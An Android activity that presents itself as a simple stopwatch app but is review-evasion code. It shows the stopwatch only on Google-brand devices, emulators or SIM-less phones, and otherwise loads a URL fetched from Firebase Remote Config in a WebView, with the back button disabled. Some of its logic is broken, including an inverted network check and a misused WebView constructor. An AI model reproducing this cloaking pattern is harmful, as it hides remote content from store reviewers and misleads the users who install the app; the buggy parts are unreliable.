package com.example.myapplication;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.Bundle;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.Chronometer;
import android.widget.CompoundButton;
import android.widget.ToggleButton;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

public class Home extends AppCompatActivity {

    private Chronometer chronometer;
    private long PauseOffSet = 0;
    private boolean isPlaying = false;
    private ToggleButton toggleButton;
    private Button reset_btn;

    private SharedPreferences sPref;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String save_URL = loadURL();
        if (save_URL != null){
            if (isNetworkConnected()){
                System.out.println("Для работы приложения необходим доступ к сети");
            }else {
                // ???
                WebView webView = new WebView(save_URL);
                Intent intent = new Intent(Home.this, webView.getClass());
                startActivity(intent);
                finish();
                //
            }
        }else {
            try {
                //
                FirebaseRemoteConfig fire = FirebaseRemoteConfig.getInstance();
                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(3600)
                        .build();
                fire.setConfigSettingsAsync(configSettings);

                fire.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            String ope = fire.getString("url");
                            String brand = Build.BRAND; //google
                            boolean mClass = checks(Home.this);
                            //
                            if (ope == null || mClass || brand.equals("google")){
                                //
                                setContentView(R.layout.home);
                                chronometer = findViewById(R.id.chronometer);
                                toggleButton = findViewById(R.id.Toggle);
                                reset_btn = findViewById(R.id.reset_btn);

                                toggleButton.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                                    @Override
                                    public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
                                        if (b){
                                            chronometer.setBase(SystemClock.elapsedRealtime()-PauseOffSet);
                                            chronometer.start();
                                            isPlaying = true;
                                        }else {
                                            chronometer.stop();
                                            PauseOffSet = SystemClock.elapsedRealtime() - chronometer.getBase();
                                            isPlaying = false;
                                        }
                                    }
                                });

                                reset_btn.setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View view) {
                                        if (isPlaying){
                                            chronometer.setBase(SystemClock.elapsedRealtime());
                                            PauseOffSet = 0;
                                            chronometer.start();
                                            isPlaying = true;
                                        }
                                    }
                                });
                                //
                            }else {
                                saveURL(ope);
                                //???
                                WebView webView = new WebView(ope);
                                Intent intent = new Intent(Home.this, webView.getClass());
                                startActivity(intent);
                                finish();
                                //
                            }
                        }
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void saveURL(String url){
        sPref = getPreferences(MODE_PRIVATE);
        SharedPreferences.Editor ed = sPref.edit();
        ed.putString("url",url);
        ed.commit();
    }

    private String loadURL(){
        sPref = getPreferences(MODE_PRIVATE);
        String url = sPref.getString("url",null);
        return url;
    }

    private boolean isNetworkConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        return cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnected();
    }

    private boolean checks(Home home){
        return isSimSupport(home) || isEmulator();
    }

    private boolean isSimSupport(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getSimState() == TelephonyManager.SIM_STATE_ABSENT;
    }

    private boolean isEmulator() {
        return (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("sdk_gphone64_arm64")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator");
    }

    @Override
    public void onBackPressed() {

    }
}